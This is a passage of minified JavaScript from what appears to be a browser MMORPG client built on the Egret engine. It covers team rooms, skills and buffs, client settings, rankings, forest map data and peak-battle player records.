i=e[t];if(i.fbId>0)return!0}return!1},__decorate([post()],e.prototype,"postRoomChange",null),__decorate([post()],e.prototype,"postOpenInviteView",null),__decorate([post()],e.prototype,"postShowFightWin",null),__decorate([post()],e.prototype,"buildRoomBack",null),__decorate([post()],e.prototype,"roomMemberInfoBack",null),__decorate([post()],e.prototype,"exitRoomBack",null),__decorate([post()],e.prototype,"postEnterStardomain",null),__decorate([post()],e.prototype,"myInfoBack",null),__decorate([post()],e.prototype,"bossInfoBack",null),__decorate([post()],e.prototype,"sceneBuffInfoBack",null),e}(n.BaseSystem);e.StardomainCT=p,window.StardomainCT=p,__reflect(p.prototype,"StardomainCT",[]),Systemap.StardomainCT=function(){return p.ins()},window.StardomainCT=p;var d=function(){function t(){this.members=[]}return t.prototype.parse=function(t){if(this.roomId=t.readDouble(),!(this.roomId<=0)){this.bossLv=t.readByte(),this.members=[],this.count=t.readByte();for(var e=0;e<this.count;e++){var i=new c;i.parse(t),this.members.push(i)}}},t}();e.StardomainRoomInfo=d,window.StardomainRoomInfo=d,__reflect(d.prototype,"StardomainRoomInfo",[]),window.StardomainRoomInfo=d;var c=function(){function t(){}return t.prototype.parse=function(t){this.roleId=t.readInt(),this.leaderStatus=t.readByte(),this.playerName=t.readString(),this.job=t.readByte(),this.sex=t.readByte(),this.zsLv=t.readInt(),this.lv=t.readInt(),this.titleId=t.readInt(),this.appearanceId=t.readInt(),this.fbId=t.readInt(),this.power=t.readDouble()},t}();e.StardomainMemberVo=c,window.StardomainMemberVo=c,__reflect(c.prototype,"StardomainMemberVo",[]),window.StardomainMemberVo=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FuLiCT=void 0;var n=i(14),o=i(17),s=i(0),a=i(4),r=i(9),l=i(23),h=i(25),u=i(7),p=i(26),d=function(t){function e(){var e=t.call(this)||this;return e.funcShowRp=new o.RedPoint,e.funcShowAwardDic=[],e.initRps(),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.isHasFuliActivity=function(t){var e=r.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(t[o.pageStyle]&&o.isOpenActivity()&&!o.getHide())return!0}return!1},e.prototype.isHasActivity=function(t){var e=r.Activity.ins().activityData,i=Object.keys(e);if(!i.length)return!1;for(var n in e){var o=e[n];if(o.pageStyle==t&&o.isOpenActivity()&&!o.getHide())return!0}return!1},e.prototype.checkOSA0_2=function(){for(var t=h.Recharge.ins().getRechargeList(),e=0;e<t.length;e++)if(1==t[e].bigReward)return!0;return!1},e.prototype.getFaceBookCfg=function(){var t,e=s.GlobalConfig.FaceBookBaseConfig;for(var i in e){if(e[i]&&e[i].apptype&&-1!=e[i].apptype.indexOf(urlParam.apptype))return e[i];(e[i]&&!e[i].apptype||!e[i].apptype.length)&&(t=e[i])}return t},e.prototype.initRps=function(){var t=this;this.funcShowRp=new o.RedPoint(function(){return t.checkFuLiNoticeRed()},l.GameLogic.ins().postFunsShow)},e.prototype.checkFuLiNoticeRed=function(){for(var t in s.GlobalConfig.NewFuncNoticeConfig){var e=this.getFunsShowAwardById(Number(t));if(1==e)return!0}return!1},e.prototype.getFunsShowAwardById=function(t){var e=s.GlobalConfig.NewFuncNoticeConfig[t];return e?1==this.funcShowAwardDic[t]?2:this.checkFuncOpen(e)&&u.GameServerCC.serverOpenDay+1>=e.recDay&&(!e.zhuanshengLv||p.ZsCT.ins().lv>=e.zhuanshengLv)&&(!e.heDay||u.GameServerCC._hefuCount>=e.heDay)?1:0:0},e.prototype.checkFuncOpen=function(t){return t?(!t.openLv||a.ActorCC.level>=t.openLv)&&u.GameServerCC.serverOpenDay+1>=t.startDay:!1},e}(n.BaseSystem);e.FuLiCT=d,window.FuLiCT=d,__reflect(d.prototype,"FuLiCT",[]),Systemap.FuLiCT=function(){return d.ins()},window.FuLiCT=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Setting=e.ClientSet=void 0;var n,o=i(14),s=i(179),a=i(4),r=i(112);!function(t){t[t.guidePart=0]="guidePart",t[t.guideStep=1]="guideStep",t[t.expFirst=2]="expFirst",t[t.headRed=3]="headRed",t[t.diedFirstTime=4]="diedFirstTime",t[t.recharge1=5]="recharge1",t[t.vip=6]="vip",t[t.role=7]="role",t[t.FB=8]="FB",t[t.recharge2=9]="recharge2",t[t.diedFirstTime2=10]="diedFirstTime2",t[t.mijiRedPoint=11]="mijiRedPoint",t[t.firstMonthCard=12]="firstMonthCard",t[t.firstrecharge1=13]="firstrecharge1",t[t.firstClickTreasure=14]="firstClickTreasure",t[t.autoHeji=15]="autoHeji",t[t.firstTouZi=16]="firstTouZi",t[t.shWing=17]="shWing",t[t.shMonster=18]="shMonster",t[t.hotBlood=19]="hotBlood",t[t.useHotBlood=20]="useHotBlood",t[t.shOtherWing=21]="shOtherWing",t[t.shTitle=22]="shTitle",t[t.shOtherTitle=23]="shOtherTitle",t[t.guide=23]="guide",t[t.gmActivity=24]="gmActivity",t[t.showPet=25]="showPet",t[t.ADD_BAG_TIME=26]="ADD_BAG_TIME",t[t.HuiShou_TIME=27]="HuiShou_TIME",t[t.GET_GOLD=28]="GET_GOLD",t[t.BlackSmith=29]="BlackSmith",t[t.FuHuo=30]="FuHuo",t[t.SETTING_HP=31]="SETTING_HP",t[t.SETTING_HP_PERCENT=32]="SETTING_HP_PERCENT",t[t.SETTING_HP_ITEM=33]="SETTING_HP_ITEM",t[t.SETTING_MP=34]="SETTING_MP",t[t.SETTING_MP_PERCENT=35]="SETTING_MP_PERCENT",t[t.SETTING_MP_ITEM=36]="SETTING_MP_ITEM",t[t.SETTING_SP=37]="SETTING_SP",t[t.SETTING_SP_PERCENT=38]="SETTING_SP_PERCENT",t[t.SETTING_SP_ITEM=39]="SETTING_SP_ITEM",t[t.BianQiang_Idx=40]="BianQiang_Idx"
}(n=e.ClientSet||(e.ClientSet={})),window.ClientSet=n,window.ClientSet=n;var l=function(t){function e(){var e=t.call(this)||this;return e.waitToSend=[],e.map={},e.sysId=PackageID.Default,e.regNetMsg(19,e.postInitSetting),e}return __extends(e,t),Object.defineProperty(e,"currPart",{get:function(){return e.ins().getValue(n.guidePart)},enumerable:!1,configurable:!0}),Object.defineProperty(e,"currStep",{get:function(){return e.ins().getValue(n.guideStep)},enumerable:!1,configurable:!0}),e.ins=function(){return t.ins.call(this)},e.prototype.postInitSetting=function(t){for(var e=t.readShort(),i=0;e>i;i++){var n=t.readInt(),o=t.readInt();this.map[n]=o,r.SysSetting.ins().newSave1[n]&&(r.SysSetting.ins().defaultValue[r.SysSetting.ins().newSave1[n]]=o)}s.GuideUtils.ins().init()},e.prototype.sendSave=function(t,e){var i=this.getBytes(19);i.writeInt(t),i.writeInt(e),this.sendToServer(i),this.map[t]=e},e.prototype.setValue=function(t,e){a.ActorCC.getIsInit()?this.sendSave(t,e):(observe(this,this.sendWaitArr,a.ActorCC.init),this.waitToSend.push([this.sendSave,this,arguments]))},e.prototype.getValue=function(t,e){return void 0===e&&(e=0),void 0==this.map[t]?e:this.map[t]},e.prototype.getValue1=function(t,e){return void 0===e&&(e=-1),void 0==this.map[t]?e:this.map[t]},e.prototype.sendWaitArr=function(){for(;this.waitToSend.length;){var t=this.waitToSend.shift(),e=t[0],i=t[1],n=t[2];e.apply(i,n)}},__decorate([post()],e.prototype,"postInitSetting",null),__decorate([post()],e.prototype,"setValue",null),e}(o.BaseSystem);e.Setting=l,window.Setting=l,__reflect(l.prototype,"Setting",[]),Systemap.Setting=function(){return l.ins()},window.Setting=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillEffectType=e.StatusType=e.SkillCT=void 0;var n=i(14),o=i(37),s=i(0),a=i(13),r=i(6),l=i(158),h=i(2),u=i(633),p=i(193),d=i(100),c=i(16),f=i(17),g=i(95),m=i(7),v=i(24),y=i(53),C=i(23),T=i(4),b=i(34),w=i(178),I=function(t){function e(){var e=t.call(this)||this;return e.noShowAuto=[1101,1102,1201,3201,3202,2101,2601,4101,4102,4201,5101,5102],e.fashiEffOut=[4003001,4003002,4003003,4003004,4003005,4003006,4003007],e.showSkillDic={},e.ViewSelectSkillIdx=0,e.itemPosList=[],e.rp=new f.RedPoint,e.lvRps=[],e.sysId=PackageID.Skill,observe(e,e.doSkillResult,Ts.useSkill),observe(e,e.postItemPos,Ts.itemPos),observe(e,e.postDoBuff,Ts.addBuff),observe(e,e.postDoRemoveBuff,Ts.removeBuff),e.regNetMsg(4,e.postSkillUpgrade),e.regNetMsg(6,e.doAddEffect),e.regNetMsg(7,e.doRemoveEffect),e.regNetMsg(18,e.doAutoSkill),e.regNetMsg(20,e.updateSkillVule),e.regNetMsg(21,e.updateSkilInfo),e.regNetMsg(22,e.doResetSkillCD),e.regNetMsg(30,e.postChainEff),observe(e,e.initRps,a.SubRoles.ins().doSubRole),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.doSkillResult=function(t){var e,i,n,r,h,f,v,y=t.handle,C=t.skillID,T=t.tarHandle,b=t.tarHandles,w=t.error,I=t.x,_=t.y;if(!w){var S=o.EntityManager.ins().getEntityByHandle(y);if(!S)return!1;var x;if(T?x=o.EntityManager.ins().getEntityByHandle(T):(x=new p.Entity,x.x=d.mainfightcc.gridToX(I),x.y=d.mainfightcc.gridToY(_)),!S.parent)return!1;var D=null===(e=s.GlobalConfig.SkillsConfig[C])||void 0===e?void 0:e.desc,A=s.GlobalConfig.SkillsDescConfig[D];if(this.hasSuitSkillEff(C,S)&&this.postFont(S,C),!D||!A||(this.postFont(x,C),2601!=D)){if(this.showSkillDic[C]&&this.showSkillDic[C].handle==(null===(n=null===(i=a.SubRoles.lookAtTar)||void 0===i?void 0:i.infoModel)||void 0===n?void 0:n.handle)&&y==(null===(h=null===(r=a.SubRoles.lookAtTar)||void 0===r?void 0:r.infoModel)||void 0===h?void 0:h.handle)&&this.showSkillDic[C].skillID==C&&m.GameServerCC.serverTime-this.showSkillDic[C].time<=300)return Timer.start(500,1,this.doSkillResult,this,this.showSkillDic[C]),void delete this.showSkillDic[C];this.showSkillDic[C]={handle:y,skillID:C,tarHandle:T,tarHandles:b,error:w,x:I,y:_,time:m.GameServerCC.serverTime};var k=new l.SkillData(C);if(u.AIUtil.ins().userSkill(S,x,k),((null===(f=S.data)||void 0===f?!0:!f.configID)||(null===(v=s.GlobalConfig.MonstersConfig[S.data.configID])||void 0===v?void 0:v.type)!=g.MonsterType.MonsterType_Fire)&&S){if(A){if(!A.noShake){var B=A.Shakeduration?A.Shakeduration:650;c.DisplayUtils.shakeItByDir(S,17,S.dir,B,1)}}else console.error(C+"技能参数描述配置有问题");S.updateFire("a")}}}},e.prototype.isTrueOrFalse=function(t){for(var e=0;e<this.fashiEffOut.length;e++)if(t==this.fashiEffOut[e])return!0;return!1},e.prototype.postFont=function(t,e){return[t,e]},e.prototype.postDoBuff=function(t){var e=t.handle,i=t.id,n=o.EntityManager.ins().getEntityByHandle(e);return n?void(y.ControlCC.isHideFightingEff||n.dealBuff(!0,i)):null},e.prototype.postDoRemoveBuff=function(t){var e=t.handle,i=t.id,n=o.EntityManager.ins().getEntityByHandle(e);if(!n)return null;n.dealBuff(!1,i);var r=o.EntityManager.ins().getEntityBymasterhHandle(T.ActorCC.handle);if(s.GlobalConfig.EffectsConfig&&s.GlobalConfig.EffectsConfig[i]&&25001==s.GlobalConfig.EffectsConfig[i].group&&e==r.infoModel.handle){var l=C.GameLogic.ins().isEnterScene;if(C.GameLogic.ins().isEnterScene=!1,!l&&e==a.SubRoles.lookAtTar.data.handle)for(var h=0,u=a.SubRoles.ins().roles[0].skillsData;h<u.length;h++){var p=u[h];if(2501==p.descID){p.endEffTime=egret.getTimer();break}}}},e.prototype.doAddEffect=function(t){var e=t.readDouble(),i=o.EntityManager.ins().getEntityByHandle(e),n=t.readInt();v.CommonUtils.getObjectByAttr(s.GlobalConfig.EffectsConfig,"effName",n)&&(null===i||void 0===i?void 0:i.addEff(n))},e.prototype.doRemoveEffect=function(t){var e=t.readDouble(),i=o.EntityManager.ins().getEntityByHandle(e),n=t.readInt();v.CommonUtils.getObjectByAttr(s.GlobalConfig.EffectsConfig,"effName",n)&&(null===i||void 0===i?void 0:i.removeEff(n))},e.prototype.postSkillUpgrade=function(t){var e=t.readShort(),i=t.readShort(),n=t.readShort(),o=a.SubRoles.ins().getSubRoleByIndex(e);if(o&&0!=o.skillsData.length){var s=o.skillsData[i],r=s.lv;return s.value=0,s.configID=l.SkillData.getSkillNewId(o.job,i+1,n+s.supLv),0==r&&0!=n&&(this.sendAutoSKill(i,1),s.autoUse=!0,h.TipsCT.ins().showSkillTips(s.configID)),[e,i,r]}},e.prototype.sendSkillUpgrade=function(){var t=this.getBytes(4);t.writeShort(0),t.writeShort(this.ViewSelectSkillIdx),this.sendToServer(t)},e.prototype.getSkillIdIcon=function(t){var e=s.GlobalConfig.SkillsConfig[t],i=1e3*Math.floor(e.id/1e3)+"_png";return i},e.prototype.sendDressHejiEquip=function(t,e){var i=this.getBytes(11);i.writeDouble(t),i.writeShort(e),this.sendToServer(i)},e.prototype.sendExchangeHejiEquip=function(t){var e=this.getBytes(12);e.writeShort(t),this.sendToServer(e)},e.prototype.isSetAutoSkill=function(t,e){if(0!=e)return!0;for(var i=a.SubRoles.ins().getSubRoleByIndex(0).skillsData,n=0;n<i.length;n++)if(n!=t&&i[n].autoUse)return!0;return!1},e.prototype.sendAutoSKill=function(t,e){var i=this.getBytes(18);i.writeShort(t),i.writeByte(e),this.sendToServer(i)},e.prototype.doAutoSkill=function(t){for(var e=t.readByte(),i=[],n=0;e>n;n++)i.push(t.readShort());var o=a.SubRoles.ins().getSubRoleByIndex(0);if(o&&o.skillsData)for(var s=o.skillsData,n=0;n<s.length;n++){var r=i.indexOf(n)>=0;s[n].autoUse=r}},e.prototype.sendSkillVule=function(t){var e=this.getBytes(20);e.writeShort(0),e.writeShort(this.ViewSelectSkillIdx),e.writeInt(t),this.sendToServer(e)},e.prototype.updateSkillVule=function(t){var e=(t.readShort(),t.readShort()),i=a.SubRoles.ins().getSubRoleByIndex(0),n=i.skillsData,o=t.readInt();n[e].value=o||0},e.prototype.sendSkilInfo=function(t){var e=this.getBytes(21);e.writeDouble(t),this.sendToServer(e)},e.prototype.updateSkilInfo=function(t){for(var e=t.readInt(),i=a.SubRoles.ins().getSubRoleByIndex(0),n=i.skillsData,o=[],s=0;e>s;s++)o.push(t.readInt());for(var s=0;e>s;s++)n[s].value=t.readInt();for(var s=0;e>s;s++){var r=t.readInt();n[s].supLv=r,n[s].configID=l.SkillData.getSkillNewId(i.job,s+1,o[s]+r)}},e.prototype.doResetSkillCD=function(t){var e,i=null===(e=a.SubRoles.ins().roles[0])||void 0===e?void 0:e.skillsData,n=t.readInt();if(i)for(var o in i)i[o].configID==n&&i[o].closeCD()},e.prototype.postChainEff=function(t){var e=t.readInt(),i=t.readByte(),n=t.readDouble(),o=t.readDouble();w.SkillEffPlayer.createChainEff(e,i,n,o)},e.prototype.postItemPos=function(t){var e=t.item;this.itemPosList=e},e.prototype.viewShowSkill=function(t){return t},e.prototype.initRps=function(){var t=a.SubRoles.ins().getSubRoleByIndex(0);if(this.lvRps=[],t&&(null===t||void 0===t?void 0:t.skillsData))for(var i=function(i){n.lvRps[i]=new f.RedPoint(function(){var e,n,o=t.skillsData[i];if(0==o.lv&&r.BagCT.ins().getBagItemById(s.GlobalConfig.SkillsDescConfig[o.descID].activation))return!0;if(o.lv<=0)return!1;if((o.value||0)<((null===(e=o.config)||void 0===e?void 0:e.proficiency)||0))return!1;var a=null===(n=o.config)||void 0===n?void 0:n.consume;if(!a)return!1;for(var l=!0,h=0;h<a.length;h++)r.BagCT.ins().getBagGoodsCountById(r.BagCT.BAG_TYPE_OTHTER,a[h].id)<a[h].count&&(l=!1);return l},e.ins().updateSkillVule,e.ins().postSkillUpgrade,r.BagCT.ins().postItemAdd,r.BagCT.ins().postItemChange),n.rp.addSub(n.lvRps[i])},n=this,o=0;o<t.skillsData.length;o++)i(o)},e.prototype.hasSuitSkillEff=function(t,e){var i=Math.floor(t/1e3),n=s.GlobalConfig.GemReviseSkillConfig[i];if(n&&e.data.suitData&&e.data.suitData.length)for(var o=0;o<e.data.suitData.length;o++){var a=e.data.suitData[o];if(-1!=n.revises.indexOf(a)){var r=s.GlobalConfig.GemReviseConfig[e.data.suitData[o]];if(r)return!0}}return!1},e.prototype.getReviseSkillIdCD=function(t){var e=s.GlobalConfig.SkillsDescConfig[t];if(e){var i=a.SubRoles.ins().getSubRoleByIndex(0),n=i?i.getAtt(b.AttributeType.atCoolDownTimeRatio):0;return e.cd*n/1e4}},__decorate([post()],e.prototype,"postFont",null),__decorate([post()],e.prototype,"postSkillUpgrade",null),__decorate([post()],e.prototype,"doAutoSkill",null),__decorate([post()],e.prototype,"updateSkillVule",null),__decorate([post()],e.prototype,"updateSkilInfo",null),__decorate([post()],e.prototype,"postChainEff",null),__decorate([post()],e.prototype,"postItemPos",null),__decorate([post()],e.prototype,"viewShowSkill",null),e}(n.BaseSystem);e.SkillCT=I,window.SkillCT=I,__reflect(I.prototype,"SkillCT",[]),Systemap.SkillCT=function(){return I.ins()},window.SkillCT=I;var _;!function(t){t[t.StatusType_Invincibility=0]="StatusType_Invincibility",t[t.StatusType_Stun=1]="StatusType_Stun",t[t.StatusType_Shild=2]="StatusType_Shild",t[t.StatusType_Armor=3]="StatusType_Armor",t[t.StatusType_Bind=4]="StatusType_Bind",t[t.StatusType_DeathCurse=5]="StatusType_DeathCurse",t[t.StatusType_AllCrit=6]="StatusType_AllCrit",t[t.StatusType_HighestHurt=7]="StatusType_HighestHurt",t[t.StatusType_ResStun=8]="StatusType_ResStun",t[t.StatusType_Frozen=9]="StatusType_Frozen",t[t.StatusType_NotRepel=10]="StatusType_NotRepel",t[t.StatusType_StunBack=11]="StatusType_StunBack",t[t.StatusType_EightGate=12]="StatusType_EightGate",t[t.StatusType_ShenMo=13]="StatusType_ShenMo",t[t.StatusType_NoGodWeapon=14]="StatusType_NoGodWeapon",t[t.StatusType_Vulnerable=15]="StatusType_Vulnerable",t[t.StatusType_RatioDamage=16]="StatusType_RatioDamage",t[t.StatusType_Shild_By_Damage=17]="StatusType_Shild_By_Damage",t[t.StatusType_Silent=18]="StatusType_Silent",t[t.StatusType_Wander=19]="StatusType_Wander",t[t.StatusType_Stealth=20]="StatusType_Stealth",t[t.StatusType_MagicMaster=21]="StatusType_MagicMaster",t[t.StatusType_Count=22]="StatusType_Count"}(_=e.StatusType||(e.StatusType={})),window.StatusType=_;var S;!function(t){t[t.SkillEffectType_Damage=1]="SkillEffectType_Damage",t[t.SkillEffectType_Heal=2]="SkillEffectType_Heal",t[t.SkillEffectType_Attr=3]="SkillEffectType_Attr",t[t.SkillEffectType_Status=4]="SkillEffectType_Status",t[t.SkillEffectType_Summon=5]="SkillEffectType_Summon",t[t.SkillEffectType_ExAttr=6]="SkillEffectType_ExAttr",t[t.SkillEffectType_EnemyMarkAttr=7]="SkillEffectType_EnemyMarkAttr",t[t.SkillEffectType_SkillTimer=8]="SkillEffectType_SkillTimer",t[t.SkillEffectType_AccDamageHeal=9]="SkillEffectType_AccDamageHeal",t[t.SkillEffectType_ShenMoMonster=10]="SkillEffectType_ShenMoMonster",t[t.SkillEffectType_AddAtkSkillArgs=11]="SkillEffectType_AddAtkSkillArgs",t[t.SkillEffectType_Damage_Lucky=12]="SkillEffectType_Damage_Lucky",t[t.SkillEffectType_Mp=13]="SkillEffectType_Mp",t[t.SkillEffectType_EnemyLossHpDamage=14]="SkillEffectType_EnemyLossHpDamage",t[t.SkillEffectType_Heal_By_Damage=15]="SkillEffectType_Heal_By_Damage",t[t.SkillEffectType_ClearBuffByType=16]="SkillEffectType_ClearBuffByType",t[t.SkillEffectType_ClearSkillCd=17]="SkillEffectType_ClearSkillCd",t[t.SkillEffectType_AddTargetCount=18]="SkillEffectType_AddTargetCount",t[t.SkillEffectType_Attr_Union=19]="SkillEffectType_Attr_Union",t[t.SkillEffectType_Trigger_HitType=20]="SkillEffectType_Trigger_HitType",t[t.SkillEffectType_FlashChain=21]="SkillEffectType_FlashChain",t[t.SkillEffectType_Heal_By_Damage_Overflow=22]="SkillEffectType_Heal_By_Damage_Overflow",t[t.SkillEffectType_Puncture_Injury=23]="SkillEffectType_Puncture_Injury",t[t.SkillEffectType_Trigger_Link=25]="SkillEffectType_Trigger_Link",t[t.SkillEffectType_Domain=26]="SkillEffectType_Domain",t[t.SkillEffectType_Domain_Skill=27]="SkillEffectType_Domain_Skill"}(S=e.SkillEffectType||(e.SkillEffectType={})),window.SkillEffectType=S},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ForestBuyVo=e.ForestMapStarVo=e.ForestMapInfoVo=e.ForestModel=void 0;var n=i(0),o=i(20),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.mapPoint11=[],e.mapInofList=[],e.mapStarList=[],e.mapBuyList=[],e.buffList=[],e.curSelecteIndex=0,e}return __extends(e,t),e.ins=function(){return this._instance||(this._instance=new e),this._instance},e.prototype.getStarCount=function(){var t=e.ins().forestLocation,i=e.ins().mapStarList;for(var n in i){var o=i[n];if(o.location==t)return o.star}return 0},e.prototype.getAllStarCount=function(){return this.forestFullStarCount},e.prototype.isForestFb=function(){return o.GameMap.fubenID>=5001&&o.GameMap.fubenID<=5100?!0:!1},e.prototype.getBuffId=function(t,i){for(var o=n.GlobalConfig.YoumingForestRewardEventConfig[i],s=e.ins().mapInofList,a=0;a<s.length;a++){var r=s[a];if(t==r.location)return o.buff[r.eventList[0]-1]}return 0},e.prototype.getCurData=function(t){for(var i=e.ins().mapInofList,n=0;n<i.length;n++){var o=i[n];if(t==o.location)return o}},e.prototype.getBuyData=function(t){for(var i=e.ins().mapBuyList,n=[],o=0;o<i.length;o++){var s=i[o];t==s.location&&n.push(s)}return n},e}(egret.HashObject);e.ForestModel=s,window.ForestModel=s,__reflect(s.prototype,"ForestModel",[]),window.ForestModel=s;var a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layer=0,e.location=0,e.eventId=0,e.linePoint1=0,e.linePoint2=0,e.eventList=[],e}return __extends(e,t),e}(egret.HashObject);e.ForestMapInfoVo=a,window.ForestMapInfoVo=a,__reflect(a.prototype,"ForestMapInfoVo",[]),window.ForestMapInfoVo=a;var r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.location=0,e.star=0,e}return __extends(e,t),e}(egret.HashObject);e.ForestMapStarVo=r,window.ForestMapStarVo=r,__reflect(r.prototype,"ForestMapStarVo",[]),window.ForestMapStarVo=r;var l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.location=0,e.buy=0,e}return __extends(e,t),e}(egret.HashObject);e.ForestBuyVo=l,window.ForestBuyVo=l,__reflect(l.prototype,"ForestBuyVo",[]),window.ForestBuyVo=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Rank=void 0;var n=i(14),o=i(71),s=i(653),a=i(305),r=i(654),l=i(655),h=i(656),u=i(657),p=i(658),d=i(659),c=i(660),f=i(661),g=i(662),m=i(663),v=i(664),y=i(665),C=i(666),T=i(81),b=i(667),w=i(668),I=i(669),_=i(670),S=i(671),x=i(673),D=i(674),A=i(675),k=i(676),B=i(677),P=function(t){function e(){var e=t.call(this)||this;return e.rankModel=[],e.rankTypeList=[],e.sysId=PackageID.Ranking,e.regNetMsg(1,e.postRankingData),e.regNetMsg(2,e.postPraiseData),e.regNetMsg(3,e.postPraiseResult),e.regNetMsg(4,e.postAllPraiseData),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){this.sendGetAllPraiseData()},e.prototype.sendGetRankingData=function(t){void 0===t&&(t=0);var e=this.getBytes(1);e.writeShort(t),this.sendToServer(e)},e.prototype.postRankingData=function(t){var e=this.getRankModel(t.readShort());return e.parser(t),e},e.prototype.sendGetPraiseData=function(t){void 0===t&&(t=0);var e=this.getBytes(2);e.writeShort(t),this.sendToServer(e)},e.prototype.postPraiseData=function(t){var i=e.ins().getRankModel(t.readShort());return i.praise.praiseTime=t.readShort(),i.praise.parser(t),i.type},e.prototype.sendGetAllPraiseData=function(){this.sendBaseProto(4)},e.prototype.postAllPraiseData=function(t){for(var i=t.readShort(),n=0;i>n;n++){var o=e.ins().getRankModel(t.readShort());o.praise.praiseTime=t.readShort()}},e.prototype.sendPraise=function(t){var e=this.getBytes(3);e.writeShort(t),this.sendToServer(e)},e.prototype.postPraiseResult=function(t){var i=e.ins().getRankModel(t.readShort());return i.praise.praiseTime=t.readShort(),[i.type,0]},e.prototype.getRankModel=function(t){if(!(t in this.rankModel)){var e=void 0;e=t==o.RankDataType.TYPE_SKIRMISH?s.RankDataSkirmish:t==o.RankDataType.TYPE_LADDER?a.RankDataLadder:t==o.RankDataType.TYPE_BAOSHI?r.RankDataZhuZao:t==o.RankDataType.TYPE_LONGHUN?l.RankDataLongHun:t==o.RankDataType.TYPE_WING?h.RankDataWing:t==o.RankDataType.TYPE_BOOK?u.RankDataBook:t==o.RankDataType.TYPE_ZS?p.RankDataZhuan:t==o.RankDataType.TYPE_SCORE?d.RankDataScore:t==o.RankDataType.TYPE_WEIWANG?c.RankDataWeiWang:t==o.RankDataType.TYPE_LUCKYNUMBER?f.RankDataLuckyNum:t==o.RankDataType.TYPE_RING?g.RankDataRing:t==o.RankDataType.TYPE_YUANSHEN?m.RankDataYuanShen:t==o.RankDataType.TYPE_37KFBOSS?v.RankData37Boss:t==o.RankDataType.TYPE_DART?y.RankDataDart:t==o.RankDataType.TYPE_GUILDDART?C.RankDataGuildDart:t==o.RankDataType.TYPE_HEIRLOOM?b.RankDataHeirloom:t==o.RankDataType.TYPE_SHENSHOU?w.RankDataShenShou:t==o.RankDataType.TYPE_HEARTMETHOD?I.RankDataHeartMethod:t==o.RankDataType.TYPE_MOSHEN?_.RankDataMoShen:t==o.RankDataType.TYPE_QINGLONG||t==o.RankDataType.TYPE_BAIHU||t==o.RankDataType.TYPE_ZHUQUE||t==o.RankDataType.TYPE_XUANWU||t==o.RankDataType.TYPE_PET?x.RankDataBase1:t==o.RankDataType.TYPE_FOREST?A.RankDataForest:t==o.RankDataType.TYPE_INVADE?k.RankDataInvade:t==o.RankDataType.TYPE_LINGJING?B.RankDataLingJing:t==o.RankDataType.TYPE_COPY?D.RankDataTT:T.RankDataBase,this.rankModel[t]=new S.RankModel(t,e)}return this.rankModel[t]},e.prototype.canPraiseByType=function(t){return!1},e.prototype.canPraiseInAll=function(){this.rankTypeList.length<=0&&(this.rankTypeList=[o.RankDataType.TYPE_POWER,o.RankDataType.TYPE_SKIRMISH,o.RankDataType.TYPE_LEVEL,o.RankDataType.TYPE_LILIAN,o.RankDataType.TYPE_XUNZHANG]);for(var t=0,e=this.rankModel;t<e.length;t++){var i=e[t];if(i&&this.rankTypeList.lastIndexOf(i.type)>-1&&i.praise&&i.praise.praiseTime<1)return!0}return!1},__decorate([post()],e.prototype,"postRankingData",null),__decorate([post()],e.prototype,"postPraiseData",null),__decorate([post()],e.prototype,"postAllPraiseData",null),__decorate([post()],e.prototype,"postPraiseResult",null),e}(n.BaseSystem);e.Rank=P,window.Rank=P,__reflect(P.prototype,"Rank",[]),Systemap.Rank=function(){return P.ins()},window.Rank=P},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.KF_PeakStatus=e.BF_PeakStatus=e.KonckReportData=e.PeakBattleReportData=e.PeakBetData=e.PeakTopRankData=e.PeakPlayerInfo=e.PeakPlayerData=e.PeakedData=void 0;var n=function(){function t(){}return t.STATE_TYPE_CN=[],t.STATE_TYPE_AWARD_CN=[],t.STATE_ICON_CN=[],t.STATE_KF_TYPE_CN=[],t.STATE_KF_TYPE_AWARD_CN=[],t.STATE_KF_ICON_CN=[],t.SERV_CN=[],t}();e.PeakedData=n,window.PeakedData=n,__reflect(n.prototype,"PeakedData",[]),window.PeakedData=n;var o=function(){function t(t){t&&this.readBaseData(t)}return t.prototype.readBaseData=function(t,e){void 0===e&&(e=!1);var i=t.readByte();this.playerList=[];for(var n=0;i>n;n++){var o=new s;e?o.readKFData(t):o.readData(t),this.playerList.push(o)}this.winId=t.readInt(),this.winPos=null,this.winId>0&&(this.playerList[0]&&this.playerList[0].roleId==this.winId?this.winPos=0:this.playerList[1]&&this.playerList[1].roleId==this.winId&&(this.winPos=1)),i=t.readByte(),this.reportList=[];for(var n=0;i>n;n++)this.reportList.push(t.readInt())},t.prototype.readToData=function(t){this.winId=t.readInt();var e=t.readByte();this.reportList=[];for(var i=0;e>i;i++)this.reportList.push(t.readInt())},t}();e.PeakPlayerData=o,window.PeakPlayerData=o,__reflect(o.prototype,"PeakPlayerData",[]),window.PeakPlayerData=o;var s=function(){function t(t){this.serverId=0,t&&this.readData(t)}return t.prototype.readData=function(t){this.roleId=t.readInt(),this.playerName=t.readString(),this.job=t.readByte(),this.sex=t.readByte(),this.pos=t.readByte()},t.prototype.readKFData=function(t){this.roleId=t.readInt(),this.serverId=t.readInt(),this.playerName=t.readString(),this.job=t.readByte(),this.sex=t.readByte(),this.pos=t.readByte()},t}();e.PeakPlayerInfo=s,window.PeakPlayerInfo=s,__reflect(s.prototype,"PeakPlayerInfo",[]),window.PeakPlayerInfo=s;var a=function(){function t(t){t&&this.readData(t)}return 